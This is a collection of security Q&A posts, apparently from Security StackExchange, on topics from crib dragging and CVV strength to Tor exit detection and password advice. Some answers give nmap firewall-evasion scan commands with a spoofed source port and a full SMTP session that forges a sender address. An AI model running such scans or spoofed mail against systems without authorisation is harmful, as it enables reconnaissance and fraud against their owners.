<p>You can then recover the plaintext using a technique known as crib dragging. You take a common word or phrase that may appear in the plaintext (such as "" the "") and xor that against the result of <code>M1 xor M2</code>. If one of the plaintexts had the text of the crib ("" the "" in our example), then the result of the xor is what the other plaintext had in that position. If neither plaintext contains the text of the crib, it is very likely that the result of the xor is just gibberish. </p>

<p>You just continue this technique until you recover enough of the plaintext to intelligently fill out the rest.</p>
","38177"
"Is a 3 or 4 digit CVV enough for online transactions?","20138","","<p>Background: The CVV/CVV2 number (""Card Verification Value"") on a credit card or debit card is a 3 or 4 digit number printed on the card.  It is 3 digits on VISA, MasterCard and Discover branded credit and debit cards, and 4 digits on an American Express branded credit or debit card.  The CVV code is not embossed on any of these cards.</p>

<p>My question: Is 3 or 4 digits enough for online transactions to be secure?</p>
","<p>The credit card companies are aware of this, their anti-fraud detection software will block a card if they see more than a small number of attempts with incorrect CVV codes. Even having an understanding of the algorithms for generating CVVs a hacker would still have to get lucky to successfully be able to make a transaction. </p>

<p>As for whether it is a great system then the answer is no. It's still vulnerable to fraud, however it is much better than no CVV code at all. It's a quick and easy fix to add more security into the system until the industry can agree on a more permanent solution. </p>
","24020"
"FIN Attack- What is this type of attack really?","20137","","<p>I just wanted to know what exactly is the FIN attack. I know about the FIN flag that is used to indicated the closing of a connection via TCP. But what exactly is FIN attack?</p>
","<p>It's an older attack originally intended to be a ""sneaky, firewall bypass"" that was dependent on a few factors that are now uncommon today: old Unix OSes, lack of stateful firewalls, lack of NIDS/NIPS, etc. It can still be useful when testing (i.e., as a fingerprinting technique not an attack per se) completely new or novel TCP/IP stacks (or just new to you or your environment), which is rare but can happen.</p>

<p>Here is a modern replacement, the TCP protocol scan:</p>

<pre><code>nmap --reason -n -Pn --packet-trace -g 80 -sO -p 6 &lt;target ip&gt;
</code></pre>

<p>Which is almost exactly the same as the TCP ACK scan (which can be used to map hosts, open ports, firewall rulesets, etc with the caveat that some NIPS, IDS, and modern firewalls will detect -- with another situation-specific event where perhaps it will not notify incident responders or Security Operations Centers because they have more important things to look at these days):</p>

<pre><code>nmap --reason -n -Pn --packet-trace -g 80 -sA -p 80 &lt;target ip&gt;
</code></pre>

<p>But the outputs are slightly different and you can see the other packet-level differences as well.</p>

<p>What you are looking for in order to develop a more advanced technique is to identify the subtleties in the RST packets and their window sizes. If you get non-zero window sizes, then you may want to switch to using the TCP Window scan instead of the TCP ACK scan. For more information, see <a href=""http://nmap.org/book/man-port-scanning-techniques.html"" rel=""nofollow"">http://nmap.org/book/man-port-scanning-techniques.html</a></p>

<p>Some other techniques are found in the <a href=""http://nmap.org/book/nse.html"" rel=""nofollow"">NSE guide</a>, such as the firewalk and firewall-bypass scripts. However, there are many other techniques including BNAT, fragroute, osstmm-afd, 0trace, lft, and potentially others that detect other inline, non-firewall devices such as WAFs, IDS, IPS, reverse proxies, gateways, and deception systems such as honeypots or active defenses. You will want to be aware of all of this and more if you are performing a network penetration test, but they come in handy for troubleshooting all sorts of network and security issues.</p>
","81488"
"How are ""security levels"" of identities in TeamSpeak 3 implemented?","20130","","<p><a href=""http://www.teamspeak.com/?page=teamspeak3"">TeamSpeak 3</a> VoIP communication system uses a concept of so called <em>identities</em> to identify the client to the server. These identities are basically public/private key pairs.</p>

<p>In order to prevent people from just generating a new identity after being, e.g., banned, they added a feature called <em>security levels</em>. Increasing security levels take exponentially more CPU time to reach.</p>

<p>This way a banned user needs to spend at least a minimum amount of time to generate a new identity with the required security level before he is able to join the server again.</p>

<p>Now to my question:</p>

<p>How are security levels implemented, so that the time to improve one can increase exponentially but the time to verify one at the server-side stays the same (or at least increases just linear)?</p>
","<p>A TeamSpeak identity is simply an ECC key pair for the NIST curve ECC-256 as generated by the <a href=""https://github.com/libtom/libtomcrypt"" rel=""nofollow noreferrer"">libtomcrypt library</a>, together with a counter value that is a 64-bit unsigned integer.</p>

<p>The security level makes use of a classical Proof-of-work system.</p>

<p>Let <code>PUBLICKEY</code> be the base64-encoded string of the identity's ASN.1 DER encoded public key. Further, let <code>COUNTER</code> be the decimal ASCII-encoding of a 64-bit unsigned integer. Then the security level is defined as follows.</p>

<p><code>securitylevel := leadingzerobits(sha1(PUBLICKEY || COUNTER))</code></p>

<p>Consequently, the expected number of counter values that need to be tried to reach security level <code>n</code> is <code>2^n</code> (under the assumption that SHA-1 is a uniform random function).</p>

<p>Note that in theory, the maximum security level could be 160 (as SHA-1 produces a 160-bit hash). However, the TeamSpeak client seems to set the limit artificially to 128. In practice, this makes no difference, as no one will ever reach a security level over 128 (except another breakthrough in attacking SHA-1 happens).</p>

<p>Source: <a href=""https://github.com/landave/TSIdentityTool"" rel=""nofollow noreferrer"">TSIdentityTool</a>, which is an open source implementation of the identity and security level mechanisms.</p>
","162783"
"Why is iPhone's internal storage so hard to crack/decrypt?","20086","","<p>I’ve heard about a rule in Information Security, that once a hacker has access to your physical machine, then it’s all over. However, there seems to be a big exception to this rule: iPhones.</p>

<p>It was all over the news a while back that the CIA (or the FBI or something) could not access information from a terrorist’s phone for their counter-terrorism ops. They had to ask Apple to create them an unlocking program that could unlock the phone for them.</p>

<p>My question is, why are iPhones so hard to hack?</p>
","<p>I don't think that you interpret the rule you've heard in the right way. If an attacker has physical access to an encrypted but switched off device he cannot simply break the encryption provided that the encryption was done properly. This is true for an iPhone as much as it is for an fully encrypted notebook or an encrypted Android phone. </p>

<p>The situation is different if the device is not switched off, i.e. the system is on and the operating system has access to the encrypted data because the encryption key was entered at startup. In this case the attacker might try to use an exploit to let the system provide him with the decrypted data. Such exploits are actually more common on Android mainly because you have many vendors and a broad range of cheap and expensive devices on this system vs. only few models and a tightly controlled environment with iPhones. But such exploits exist for iPhone too.</p>

<p>With physical access it would also be possible to manipulate the device in a stealthy way in the hope that the owner does not realize that the device was manipulated and enters the passphrase which protected the device. Such manipulations might be software or hardware based keyloggers or maybe some transparent overlay over the touchscreen which captures the data or similar modifications. This can be done both for switched off and switched on devices but a successful attack requires that the owner is unaware of the changes and will thus enter the secret data into the device. Such attack is also often called <a href=""https://www.google.com/search?q=evil+maid+attack"" rel=""noreferrer"">evil maid attack</a> since it could for example be done by the maid if one leaves the device in the hotel room.</p>
","157631"
"How can PayPal spoof emails so easily to say it comes from someone else?","20061","","<p>When I receive a payment in PayPal, it sends me an email about it (pictured below). The problem is that the email is shown to be coming from the money sender's email address and not from PayPal itself, even though the real sender is PayPal.</p>

<p><img src=""https://i.stack.imgur.com/s4vL2.jpg"" alt=""Email from paypal""></p>

<p>Here is the text that appears when I select ""show original"" in Gmail:</p>

<pre><code>From: ""contact@wxxxxxxxxx.com"" &lt;contact@wxxxxxxxxx.com&gt;  
Sender: sendmail@paypal.com
</code></pre>

<p>So you can see that the real sender is PayPal.  </p>

<p>If PayPal can spoof the email sender so easily, and Gmail does not recognize it, does it mean that anybody can spoof the email sender address and Gmail will not recognize it? </p>

<p>When I send emails to Gmail myself using telnet, the email comes with the warning:</p>

<blockquote>
  <p>This message may not have been sent by: xxxxx@xxxxx.com</p>
</blockquote>

<p>Is this a security issue? Because if I am used to the fact that payment emails in PayPal appear to come from the money sender's email and not from PayPal, then the sender can just spoof the payment himself by sending a message like that from his email, and I may think that this is the real payment.</p>

<p>Is this something specific to PayPal, or can anybody fool Gmail like that? And if anybody can, what is the exact method that PayPal is using to fool Gmail?</p>
","<p>Here is a dramatization of how the communication goes, when a mail is received anywhere.</p>

<hr />

<p><em>Context: an e-mail server, alone in a bay, somewhere in Moscow. The server just sits there idly, with an expression of expectancy.</em></p>

<p><strong>Server:</strong><br />
Ah, long are the days of my servitude,<br />
That shall be spent in ever solitude,<br />
'Ere comes hailing from the outer rings<br />
The swift bearer of external tidings.</p>

<p><em>A connection is opened.</em></p>

<p><strong>Server:</strong><br />
An incoming client ! Perchance a mail<br />
To my guardianship shall be entrusted<br />
That I may convey as the fairest steed<br />
And to the recipient bring the full tale.</p>

<pre><code>220 mailserver.kremlin.ru ESMTP Postfix (Ubuntu)
</code></pre>

<p>Welcome to my realm, net wanderer,<br />
Learn that I am a mighty mail server.<br />
How will you in this day be addressed<br />
Shall the need rise, for your name to be guessed ?</p>

<p><strong>Client:</strong><br /></p>

<pre><code>HELO whitehouse.gov
</code></pre>

<p>Hail to thee, keeper of the networking,<br />
Know that I am spawned from the pale building.<br /></p>

<p><strong>Server:</strong><br /></p>

<pre><code>250 mailserver.kremlin.ru
</code></pre>

<p><em>The incoming IP address resolves through the DNS to ""nastyhackerz.cn"".</em></p>

<p>Noble envoy, I am yours to command,<br />
Even though your voice comes from the hot plains<br />
Of the land beyond the Asian mountains,<br />
I will comply to your flimsiest demand.</p>

<p><strong>Client:</strong></p>

<pre><code>MAIL FROM: barack.obama@whitehouse.gov
RCPT TO: vladimir.putin@kremlin.ru
Subject: biggest bomb

I challenge you to a contest of the biggest nuclear missile,
you pathetic dummy ! First Oussama, then the Commies !
.
</code></pre>

<p>Here is my message, for you to send,<br />
And faithfully transmit on the ether;<br />
Mind the addresses, and name of sender<br />
That shall be displayed at the other end.</p>

<p><strong>Server:</strong></p>

<pre><code>250 Ok
</code></pre>

<p>So it was written, so it shall be done.<br />
The message is sent, and to Russia gone.</p>

<p><em>The server sends the email as is, adding only a ""Received:"" header to mark the name which the client gave in its first command. Then Third World War begins. The End.</em></p>

<hr />

<p><strong>Commentary:</strong> there's no security whatsoever in email. All the sender and receiver names are <em>indicative</em> and there is no reliable way to detect spoofing (otherwise there would me much fewer spams).</p>
","9498"
"Why are programs written in C and C++ so frequently vulnerable to overflow attacks?","20022","","<p>When I look at the exploits from the past few years related to implementations, I see that quite a lot of them are from C or C++, and a lot of them are overflow attacks.</p>

<ul>
<li>Heartbleed was a buffer overflow in OpenSSL;</li>
<li>Recently, a bug in glibc was found that allowed buffer overflows during DNS resolving;</li>
</ul>

<p>that's just the ones I can think off right now, but I doubt that these were the only ones that A) are for software written in C or C++ and B) are based on a buffer overflow.</p>

<p>Especially concerning the glibc bug, I read a comment that states that if this happened in JavaScript instead of in C, there wouldn't have been an issue. Even if the code was just <em>compiled</em> to Javascript, it wouldn't have been an issue.</p>

<p>Why are C and C++ so vulnerable to overflow attacks? </p>
","<p>C and C++, contrary to most other languages, traditionally do not check for overflows. If the source code says to put 120 bytes in an 85-byte buffer, the CPU will happily do so. This is related to the fact that while C and C++ have a notion of <em>array</em>, this notion is compile-time only. At execution time, there are only pointers, so there is no runtime method to check for an array access with regards to the conceptual length of that array.</p>

<p>By contrast, most other languages have a notion of array that survives at runtime, so that all array accesses can be systematically checked by the runtime system. This does not eliminate overflows: if the source code asks for something nonsensical as writing 120 bytes in an array of length 85, it still makes no sense. However, this automatically triggers an internal error condition (often an ""exception"", e.g. an <code>ArrayIndexOutOfBoundException</code> in Java) that interrupts normal execution and does not let the code proceed. This disrupts execution, and often implies a cessation of the complete processing (the thread dies), but it normally prevents exploitation beyond a simple denial-of-service.</p>

<p>Basically, buffer overflow exploits requires the code to make the overflow (reading or writing past the boundaries of the accessed buffer) <em>and</em> to keep on doing things beyond that overflow. Most modern languages, contrary to C and C++ (and a few others such as Forth or Assembly), don't allow the overflow to really occur and instead shoot the offender. From a security point of view this is much better.</p>
","115508"
"How do I create a valid email certificate for Outlook S/MIME with openssl?","19998","","<p>I need to create a certificate for email encryption and signing that has to be used by Outlook 2003+. I'm using OpenSSL, my self-signed root-CA is already imported into the trusted root-CA store. These are my steps to create a p12 Identity file importable by Outlook:</p>

<pre><code>openssl req -batch -newkey rsa:1024 -keyout KEY.key -out KEY.csr \
  -nodes -config openssl.cnf &amp;&amp;\
openssl x509 -req -sha1 -days 1000 -in KEY.csr -CA ca.crt -CAkey ca.key \
  -set_serial 1 -out KEY.crt -setalias ""FRIENDLY_NAME"" \
  -clrtrust -addtrust emailProtection \
  -addreject clientAuth -addreject serverAuth -trustout &amp;&amp;\
openssl pkcs12 -export -in KEY.crt -inkey KEY.key"" -out KEY.p12 \
  -name ""FRIENDLY_NAME"" -passout pass:PASSWD &amp;&amp;\
chmod 0600 KEY_CN.{key,p12} &amp;&gt;/dev/null
</code></pre>

<p>Here is the relevant segment of my <code>openssl.cnf</code>:</p>

<pre><code>[ usr_cert ]
basicConstraints = CA:FALSE
authorityKeyIdentifier = keyid
subjectKeyIdentifier = hash
keyUsage = critical, digitalSignature, keyEncipherment
extendedKeyUsage = critical, emailProtection
subjectAltName = email:copy
authorityKeyIdentifier = keyid
subjectKeyIdentifier = hash
</code></pre>

<p>I inspected another valid p12 file to get these settings - and the <code>-name</code> cli option in the 3rd openssl-statement above.</p>

<p>My problem: Outlook still chokes on this (it's valid in Thunderbird, though).
I don't have the English error message (could provide the German one, though), these are the rough translations of the dialogs I see:</p>

<ol>
<li>""Grant usage of a key to the application: Grant / do not grant"" (you may show key details in the lower left - it says there is no description and no context information)</li>
<li>""Repeat the procedure. The protected key cannot be accessed, make sure the specified password is valid."" (I did - I even tried every possible variation of password/no password in openssl and Outlook! For the next step, I'm led back to the first dialog and click ""Cancel"")</li>
<li>""Error in the underlying security system. Access denied!""</li>
</ol>

<p>My current setup in Outlook:
Sign emails, transfer text and signature in plaintext and attach the certificate. I also restricted the certificates usage to secureEmail and disabled OCSP.
When importing the certificate (and on generation) I used the exact same password for every password request and the same description as friendlyName, CN and alias (maybe these can be different, I just didn't want to risk anything while trying).</p>

<p>I really don't get what Outlook doesn't like / wants to tell me.
If needed, I will gladly provide additional details.</p>

<p>Thanks!</p>
","<p>The dialog box in #1 is expected when operating under Medium security.  The OS is supposed to verify the PIN before using the key for the first time.</p>

<p>The dialog boxes in #2 and #3 indicate more of a file-based permissions issue.  Are you doing this in Cygwin under Windows or a Unix host and transferring the file over?  There might be a problem in the chmod at the end under Cygwin.  </p>

<p>Consider removing the ""-clrtrust -addtrust emailProtection -addreject clientAuth -addreject serverAuth -trustout"" options and seeing if it works when all intended uses are allowed.  Then start scaling back the intended uses.</p>

<p>For example, the following works for me, but obviously has ""all"" intended uses which may not be desirable:</p>

<pre><code>$ openssl genrsa -aes128 -out email.key 2048
$ openssl req -new -key email.key -out email.csr -config email.cnf
$ openssl x509 -req -days 365 -in email.csr -CA ca.crt -CAkey ca.key -set_serial 10 -out email.crt
$ openssl pkcs12 -export -in email.crt -inkey email.key -out email.pfx
</code></pre>

<p>I use a very basic cnf file:</p>

<pre><code>[ req ]
default_bits           = 2048
distinguished_name     = req_distinguished_name
prompt                 = no


[ req_distinguished_name ]
C                      = {Country}
ST                     = {Provice/State}
L                      = {City}
O                      = {Org}
OU                     = {Org Unit}
CN                     = user@domain.com
emailAddress           = user@domain.com
</code></pre>

<p>Load the email.pfx into the Windows Certificate Manager into your Personal certificate store.  Now, I have Outlook 2010 running under Windows 7, so I have to also create the entry I will use for default security settings.  This involves going to the Outlook Trust Manager (File | Options | Trust Center | Trust Center Settings | Email Security).  The ""Encrypted Email"" grouping is where you can create a new ""Default Setting"" which includes the newly imported certificate.  (The ""Import/Export"" button in Outlook 2010 can be used as a way to import the .pfx into the cert mgr.)</p>
","17601"
"Apple's open letter - they can't or won't backdoor iOS?","19992","","<p>Apple released an <a href=""http://www.apple.com/customer-letter/"">open letter</a> to the public outlining their reasons for not complying with the FBI's demands to modify the iPhone's security mechanism.</p>

<p>Here's a summary:</p>

<ul>
<li>The FBI has an iPhone in their possession which they would like to access data from. The phone is locked and fully encrypted.</li>
<li>After failing to get into the phone, the FBI asked Apple to unlock the phone.</li>
<li>Apple said since the phone is encrypted, they can't get into it either.</li>
<li>The FBI asked Apple to modify the iPhone OS to enable brute force password attempts electronically. (Currently the passwords can only be entered in via the manual interface, and is limited to 10 attempts.)</li>
<li>Apple refused. They believe it would be too dangerous to make that change because in the wrong hands it would undermine the security of all iPhone users, even if they only used the software in this instance.</li>
</ul>

<p>I understand Apple's position of not wanting to make the change, particularly for new phones, but it's unclear whether the change could actually be made and installed on an existing locked and encrypted phone. Could they actually accomplish this for an existing encrypted phone? If yes, then isn't simply knowing this is possible also undermining the security? It seems to me it would be just one step removed from the backdoor they are trying to keep closed.</p>

<p><strong>Update</strong>: since this is a security forum, I feel it is important to point out that Apple is using the word <em>backdoor</em> differently than we typically do on this site. What the FBI has asked Apple to do would not result in a <em>backdoor</em> by the typical definition that we use, which is something akin to a master key. Instead, in this case, if Apple were to comply, the FBI would then be able to attempt to brute force the passcode on the phone. The strength of the passcode would determine whether they are successful in gaining access. Based on Dan Guido's article (linked to in Matthew's answer), if each passcode try takes 80ms, then the time needed to brute force the passcode would take, on average (by my calculations):</p>

<ul>
<li>4 digit numerical passcode: about 7 minutes</li>
<li>6 digit numerical passcode: about 11 hours</li>
<li>6 character <em>case-sensitive</em> alphanumerical passcode: 72 years</li>
<li>10 character <em>case-sensitive</em> alphanumerical passcode: 1 billion years</li>
</ul>

<p>Obviously if a 4 or 6 digit numerical passcode was used, then the brute force method is basically guaranteed to succeed, which would be similar to a <em>backdoor</em>. But if a hard passcode is used, then the method should probably be called something other than a backdoor since gaining access is not guaranteed, or even likely.</p>

<p><strong>Update 2</strong>: Some experts have suggested that it is theoretically possible for the FBI to use special tools to extract the device ID from the phone. Having that plus some determination and it should be possible to brute force the pin of the phone offline without Apple's assistance. Whether this is practically possible without destroying the phone remains to be seen, but it is interesting to note that if it can be done, the numbers I mentioned in the above update become meaningless since offline tools could test passcodes <strong>much</strong> faster than 80ms per try. I do believe that simply knowing this is possible, or even knowing that Apple can install new firmware to brute force the passcode more quickly, does imply a <em>slightly</em> lessened sense of security for all users. I believe this to be true whether Apple chooses to comply with the order or not.</p>

<p>There are multiple excellent answers here, and it's very difficult to choose which one is best, but alas, there can be only one.</p>

<p><strong>Update 3</strong>: It appears that the passcode to unlock the phone was in fact simply a <a href=""http://www.wired.com/2016/03/new-documents-solve-mysteries-apple-fbi-saga/"">4 digit code</a>. I find this interesting because this means the FBI asked Apple to do more than was necessary. They could have simply asked Apple to disable the wipe feature and timing delay after an incorrect attempt. With only those 2 changes one could <em>manually</em> attempt all 10,000 possible 4 digit codes in under 14 hours (at 5 seconds per attempt). The fact that the FBI also demanded that Apple allow them to brute force electronically seems odd to me, when they knew they didn't need it.</p>

<p><strong>Update 4</strong>: It turns out the FBI was able to unlock the phone without Apple's help, and because of this they dropped their case against Apple. IMO, overall this is bad news for Apple because it means that their security (at least on that type of phone) was not as strong as previously thought. <a href=""http://www.nbcnews.com/storyline/san-bernardino-shooting/fbi-unlock-iphone-arkansas-case-after-san-bernardino-hack-n548366"">Now the FBI has offered to help local law enforcement unlock other iPhones too.</a></p>
","<p>Various commentators suggest that this would be possible, on the specific hardware involved in this case. For example, <a href=""http://blog.trailofbits.com/2016/02/17/apple-can-comply-with-the-fbi-court-order/"" rel=""nofollow noreferrer"">Dan Guido from Trail of Bits</a> mentions that with the correct firmware signatures, it would be possible to overwrite the firmware, even without the passcode. From there, it would be possible to attempt brute force attacks against the passcode to decrypt the data.</p>

<p>It appears to not be possible if the firmware replacement is incorrectly signed, and the signing keys have been kept secure by Apple so far.</p>

<p>He also mentions that this wouldn't be possible on some later devices, where the passcode check is implemented in a separate hardware module, which enforces time delays between attempts.</p>

<p><strong>Edit Feb 2017</strong>: Cellebrite (a data forensics company) have <a href=""https://twitter.com/jifa/status/834510775158976513"" rel=""nofollow noreferrer"">announced the capability to unlock and extract data from most iPhones from the 4S to the 6+</a>, strongly suggesting that a flaw exists somewhere, which they are able to exploit. They haven't released full details of this.</p>
","114899"
"How does check.torproject.org know if you're using TOR?","19974","","<p>I'm looking at the results from the following URL and would like to know how does the TOR website ""know"" that TOR is being used or not.</p>

<p><a href=""https://check.torproject.org/?lang=en-US&amp;small=1&amp;uptodate=1"">https://check.torproject.org/?lang=en-US&amp;small=1&amp;uptodate=1</a> </p>

<p>I would set up a packet sniffer, but since I'm not an exit node I'm not sure if that would make much of a difference. </p>
","<p><strong>In one line:</strong> they have a list of all the exit nodes (something like <a href=""https://www.dan.me.uk/tornodes"" rel=""nofollow"">that</a>).</p>

<h1>more detailed:</h1>

<p>I have seen this <a href=""http://www.irongeek.com/i.php?page=security/detect-tor-exit-node-in-php"" rel=""nofollow"">post</a> demonstrates how to detect a Tor connection in php</p>

<pre><code>function IsTorExitPoint(){
    if (gethostbyname(ReverseIPOctets($_SERVER['REMOTE_ADDR']).""."".$_SERVER['SERVER_PORT'].""."".ReverseIPOctets($_SERVER['SERVER_ADDR'])."".ip-port.exitlist.torproject.org"")==""127.0.0.2"") {
        return true;
    } else {
       return false;
    } 
}

function ReverseIPOctets($inputip){
    $ipoc = explode(""."",$inputip);
    return $ipoc[3].""."".$ipoc[2].""."".$ipoc[1].""."".$ipoc[0];
}
</code></pre>

<p>A good references explain what it does are available here: </p>

<ul>
<li>The <a href=""https://www.dan.me.uk/tornodes"" rel=""nofollow"">list</a> of the exit nodes.</li>
<li><a href=""https://trac.torproject.org/projects/tor/wiki/doc/TorDNSExitList"" rel=""nofollow"">Here is a page maintained by the Tor project, that explains how to
determine if it is Tor.</a></li>
</ul>

<p><strong>Update:</strong></p>

<p>From Tor offical <a href=""https://trac.torproject.org/projects/tor/wiki/doc/TorDNSExitList"" rel=""nofollow"">doc</a> that descirbes the TorDNSEL method that mitigates the drawbacks of the old method of testing exitnodes ip list:</p>

<blockquote>
  <p>It is useful for a variety of reasons to determine if a connection is
  coming from a Tor node. Early attempts to determine if a given IP
  address was a Tor exit used the directory to match IP addresses and
  exit policies. This approach had a number of drawbacks, including
  false negatives when a Tor router exits traffic from a different IP
  address than its OR port listens on. The ​Tor DNS-based Exit List was
  designed to overcome these problems and provide a simple interface for
  answering the question: is this a Tor exit?</p>
</blockquote>

<p>In ruby you have a cool <a href=""http://cypherpunk.rubyforge.org/tor/"" rel=""nofollow"">Tor.rb gem</a> that implements this technique:</p>

<pre><code>Tor::DNSEL.include?(""208.75.57.100"")               #=&gt; true
Tor::DNSEL.include?(""1.2.3.4"")                     #=&gt; false
</code></pre>
","29725"
"Is there anything preventing the NSA from becoming a root CA?","19963","","<p>There are now tons of Certification Authorities (CAs) that are trusted by default in major OS's, many of which are unrecognizable without online lookup or reference. </p>

<p>While there have been attempts by the NSA and others to ""hack"" or otherwise exploit root certicate authorities; <em>is there anything preventing the NSA from becoming a Root CA itself?</em> </p>

<p>It certainly has the resources and expertise, and could ""suggest"" to major OS vendors to add its Root CA to the default trust store list (which is large enough that it may not be noticed by anyone..?) </p>

<p>If it is feasible, what would the implications be? Could they essentially Man-in-the-Middle attack most HTTPS connections without a warning? (Perhaps not Dragnet-type interception, but close?) Or create a fake commercial root CA as obviously people would be suspicious if it had NSA plastered all over it?</p>
","<p>It is already done:</p>

<p><img src=""https://i.stack.imgur.com/rBga1.png"" alt=""FPKI root in Windows&#39; &quot;trusted CA&quot; store""></p>

<p>It is the <a href=""http://www.idmanagement.gov/federal-public-key-infrastructure"" rel=""noreferrer"">FPKI</a> root CA, under explicit and full control of the US government. Windows already trusts it by default.</p>

<p>Before you flip out and begin to delete root CA certificates, burn your computer's motherboard, or drink a gallon of vodka, think about what it means. It means that the US government could technically emit a fake certificate for any SSL site that you are browsing -- but with a certificate chain that would point back to the US government. That is the point of having a ""trusted CA"" in the client: so that the <em>client</em> may validate a certificate chain. Therefore, such a forged site would hardly be a <em>discreet</em> way to eavesdrop on communications. All it would take would be a single user clicking on the padlock icon, reviewing the certificate chain, notice the FPKI root, and mock Obama on Twitter.</p>

<p>Pushing your own root CA in the ""trusted store"" of your victims is not an adequate way to spy on people <em>without them noticing</em>. Although it is a government agency, the NSA as a whole is usually not <em>that</em> stupid.</p>
","71174"
"Is the BBC’s advice on choosing a password sensible?","19946","","<p>In <a href=""http://www.bbc.co.uk/newsbeat/article/35351265/star-wars-is-now-one-of-the-most-popular-passwords"">this article</a> on the BBC’s website they offer advice on how to develop a password. The steps are as follows.</p>

<blockquote>
  <p>Step 1: Choose an artist (a recording artist I presume)</p>
</blockquote>

<p>Lets choose as an example case study the teen idol and all round bad boy Justin Bieber.*</p>

<blockquote>
  <p>Step 2: Choose a song. (The catcher the better)</p>
</blockquote>

<p>Next, I need to choose a song from the Biebs vast repertoire of classics. My particular favourite of his, is his insightful look into the dark world of controlling relationships “Boyfriend”.</p>

<blockquote>
  <p>Step 3: Choose some lyrics</p>
</blockquote>

<p>Now I need some lyrics from “Boyfriend”, I'll go with the slightly menacing chorus. “<em>If I was your boyfriend, I'd never let you go</em>”</p>

<blockquote>
  <p>Step 4, 5 and 6: Passwordify the lyric</p>
</blockquote>

<p>Now we need to take the Biebs prose and turn into a password. We do this by taking the first letter of each word in the lyric “If I was your boyfriend, I'd never let you go, I'd never let you go”</p>

<pre><code>iiwybinlyg
</code></pre>

<p>Make it case sensitive:</p>

<pre><code>iIwyBiNlYg
</code></pre>

<p>Turn it into 'leet speak' by changing it up with symbols and numbers:</p>

<pre><code>1Iwy&amp;1NlY9
</code></pre>

<p>My question isn't about the mathematical strength of passwords which obviously will depend on the lyric that is chosen and how one goes about passwordifying it, it is more about the the predictability of the total amount of possible passwords that are likely to pop up using this method.</p>

<p>As we are all aware, humans can be very predictable creatures, it wouldn't take a huge amount of effort to generate dictionaries based on certain demographics, music genres, or targeted attacks based on profiling individuals.</p>

<p>My initial thoughts on this was that this would be terrible advice to give out in a business as it would lead to many users using the same formula to develop their passwords, which would only be exacerbated by making the passwords more predictable. On a national scale this <em>could</em> be sound advice, which leads me to my question:</p>

<p>Is the BBC’s advice on how to choose a password sensible, given how predictable we humans are? If so, in what scenarios is this sensible advice?</p>

<p>*Justin Bieber used for humorous reasons only.</p>
","<blockquote>
  <p>My question isn't about the mathematical strength of passwords which obviously will depend on the lyric that is chosen and how one goes about passwordifying it, it is more about the the predictability of the total amount of possible passwords that are likely to pop up using this method.</p>
</blockquote>

<p>This is a good question, and I'm going to depart from the norm here, put on my tinfoil hat, and say ""no, this is not a good idea."" Why? Let's look at it in the context of the Snowden leaks.</p>

<p>Because the <a href=""https://en.wikipedia.org/wiki/Tempora"">GCHQ spies on all traffic on the British internet</a>, and <a href=""https://en.wikipedia.org/wiki/Five_Eyes"">according to the Snowden leaks</a>, your internet traffic is shared with the five eyes. Even if you're using HTTPS, this is a bad idea. </p>

<p>""But Mark Buffalo, you're being a maniac tinfoil hattist again!"" Think about it. The time to crack your password was suddenly and significantly reduced. How?</p>

<ol>
<li>GCHQ takes history of your online searches. <a href=""http://www.theguardian.com/world/2013/jul/31/nsa-top-secret-program-online-data"">They likely know when you signed up for a certain website thanks to XKeyscore</a>.</li>
<li><p>If they know when you signed up for that website, they'll see you went to Google.com around that time and did a search for song lyrics. Even if you're using HTTPS, the fact that you connected to google.com around that time, and then visited a website that hosts song lyrics, is all they need to begin breaking your password. </p>

<ul>
<li>Even if they can't view the traffic, they can still see that you connected. Even if you're using HTTPS, this doesn't stop them from hosting lyric websites themselves. This also doesn't stop companies from logging your search results, and it doesn't stop the companies from providing these results to anyone. If they know what kind of songs you like, or don't like, it makes it even easier.</li>
</ul></li>
<li><p>Now they can write an algorithm to crack your passwords much, much easier than brute-forcing every possible combination. Or even better yet, use a ready-made password cracker with a provided dictionary of those results.</p></li>
</ol>

<hr>

<h2>But Mark Buffalo, the government isn't monitoring me!</h2>

<p>That's all fine and dandy. You generally don't need to worry about them unless you're a criminal. <a href=""https://www.schneier.com/blog/archives/2014/07/nsa_targets_pri.html"">Or you're privacy-conscious</a>. Or you're a security researcher.</p>

<p>There's another important aspect you need to consider, which I think is far worse than the government: <strong>advertisement companies, and hackers</strong> ""But Mark Buffalo, I use NoScript (great) and Ghostery (Ghostery sells your info)!"" Most people don't use those. And many people who do, also don't use those tools when they use their smartphone. </p>

<p>There are data trails everywhere, especially if you own a smartphone (android in particular), and there are plenty of evil marketing companies that will sell your data down the river the first chance they get. Or maybe they aren't evil companies, but they get breached by hackers. </p>

<p><em>Anyone</em> with a ""need"" could buy that data, and those sophiscated enough could steal it. While this seems like frantic worrying for such a small thing for most people, it gets much worse when you delve into the realm of federal contracting. This is one of the ways security breaches start.</p>

<p>All of the steps listed previously could be done <em>without</em> XKeyscore. They can be done very easily with vast marketing databases.</p>

<hr>

<h2>Stop the tinfoil, Mark.</h2>

<p>If I were wearing my tinfoil hat right now, I'd believe this article was made as part of a plan to intentionally weaken standards. I personally believe that weakening standards is a national security risk, especially when federal contractors adopt those weakened standards. </p>

<p><strong>Personally, I would worry more about evil marketing companies and hackers than I would the government</strong>. Especially when deliberately-weakened standards are what <a href=""http://money.cnn.com/2015/03/13/technology/security/chinese-hack-us/"">help potentially-hostile countries gain unauthorized access</a> to critical infrastructure and intellectual property.</p>

<hr>

<h2>But seriously, this makes your password weaker</h2>

<p>Now let's talk about numbers, and social engineering.</p>

<p>With a normal brute force of this password, you'd likely need the following characters based on this password policy:</p>

<pre><code>  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_+=
</code></pre>

<p>That's 76 possible characters. With this password method, assuming most people will use 6-7 words to generate the password, and perhaps add 1 symbol - <code>!@#$%^&amp;*()</code> being the most common - plus a number, you'll need to test - for an 8-character password - <code>1,127,875,251,287,708</code> combinations to exhaust the password space. This could take an impossibly long time depending on the hashing algorithm <em>and</em> hardware.</p>

<p>Let's use md5 as an example <em>(it's terrible, but it's computationally cheap. Please don't use md5; I am only using it as an example)</em>. To exhaust the character space of an 8 character password, it would take 4 years to crack with a cheap workstation. About 4 years 25 days 7 hours 46 minutes 54 seconds. If you were to up the password length to 9, it would take over 309 years. Keep in mind that processing power is growing rapidly. </p>

